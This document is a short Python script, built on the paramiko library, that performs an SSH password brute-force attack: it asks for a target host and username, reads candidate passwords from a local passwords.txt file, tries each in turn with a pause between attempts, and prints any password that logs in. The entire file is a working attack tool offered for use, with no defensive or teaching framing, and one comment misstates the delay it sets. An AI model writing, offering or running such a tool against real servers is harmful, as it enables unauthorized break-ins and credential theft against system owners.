import os
import paramiko
import time

def ssh_brute_force(hostname, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, username=username, password=password, timeout=5, banner_timeout=200)
        print(f"Successfully logged in: {username}@{hostname} with password: {password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"Failed to log in: {username}@{hostname} with password: {password}")
        return False
    except Exception as e:
        print(f"Error: {str(e)}")
        return False

def main():
    hostname = input("Enter the target hostname or IP address: ")
    username = input("Enter the username to brute force: ")
    password_file = os.path.join(os.path.dirname(__file__), "passwords.txt")

    if not os.path.isfile(password_file):
        print("Error: Password file 'passwords.txt' not found in the same directory.")
        return

    with open(password_file, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()  # Remove leading/trailing whitespaces
        if ssh_brute_force(hostname, username, password):
            break
        time.sleep(2)  # Add a 1-second delay between each attempt

if __name__ == "__main__":
    main()
